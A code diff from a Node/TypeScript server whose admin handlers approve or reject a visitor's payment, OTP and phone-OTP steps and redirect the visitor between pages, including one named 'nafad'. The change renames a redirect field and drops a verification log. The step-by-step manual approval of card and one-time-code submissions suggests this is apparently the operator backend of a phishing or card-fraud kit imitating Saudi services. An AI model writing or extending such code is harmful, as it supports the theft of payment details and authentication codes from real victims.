@@ -764,9 +764,9 @@ async function startServer() {
       if (action === "approved") {
         updateData._v1Status = "approved";
         updateData.paymentStatus = paymentStatus || "completed";
-        updateData.redirectPage = "step2";
+        updateData.oneTimeRedirect = "step2"; // One-time redirect flag
         updateData.currentStep = "_t2";
-        console.log('[PaymentAction] Approved - setting redirectPage to step2');
+        console.log('[PaymentAction] Approved - setting oneTimeRedirect to step2');
       } else if (action === "rejected") {
         updateData._v1Status = "rejected";
         updateData.paymentStatus = "rejected";
@@ -803,7 +803,7 @@ async function startServer() {
       if (action === "approved") {
         updateData._v5Status = "approved";
         updateData.otpStatus = "completed";
-        updateData.redirectPage = "step3";
+        updateData.oneTimeRedirect = "step3"; // One-time redirect flag
         updateData.currentStep = "_t3";
         updateData.currentPage = "step3";
       } else if (action === "rejected") {
@@ -894,7 +894,7 @@ async function startServer() {
         updateData.phoneOtpStatus = "approved";
         updateData.phoneRejectionMessage = null;
         updateData.phoneResendRequested = null;
-        updateData.redirectPage = "step4";
+        updateData.oneTimeRedirect = "step4"; // One-time redirect flag
         updateData.currentStep = "_t6";
         updateData.currentPage = "nafad";
       } else if (action === "rejected") {
@@ -1008,11 +1008,11 @@ async function startServer() {
       const currentVisitor = await readVisitor(visitorId);
       const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
 
-      // Clear ALL previous statuses to prevent conflicts
+      // Clear ALL previous statuses and set one-time redirect
       const updateData: Record<string, any> = {
         adminRedirectPage: targetPage,
         adminRedirectAt: new Date().toISOString(),
-        redirectPage: targetPage,
+        oneTimeRedirect: targetPage, // One-time redirect flag
         currentPage: targetPage,
         // Clear all previous statuses
         phoneOtpStatus: null,
@@ -1028,10 +1028,6 @@ async function startServer() {
 
       console.log("[Dashboard Redirect] Saving updateData:", updateData);
       await upsertVisitor(visitorId, updateData);
-      
-      // Verify it was saved
-      const verifyVisitor = await readVisitor(visitorId);
-      console.log("[Dashboard Redirect] Verified visitor data:", verifyVisitor?.redirectPage);
 
       const dashboardData = await upsertDashboardRequest({ 
         id: visitorId, 
